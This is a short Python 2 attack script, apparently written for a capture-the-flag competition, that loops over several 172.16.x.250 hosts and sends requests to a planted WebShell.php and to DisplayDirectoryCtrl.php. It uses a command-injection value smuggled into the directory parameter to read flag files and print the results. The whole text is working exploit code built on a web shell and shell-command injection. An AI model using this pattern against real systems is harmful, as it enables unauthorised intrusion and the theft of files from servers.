import requests
for i in range(100,105):
        try:
                res=requests.get("http://172.16."+str(i)+".250/WebShell.php?cmd=cat+%2Froot%2Fflag*.txt")
                res1=requests.get("http://172.16."+str(i)+".250/DisplayDirectoryCtrl.php?directory=%7Ccat+%2Fflag*.txt")
                print res1.text,i
                print res.text,i
        except:
                print i,("con down")

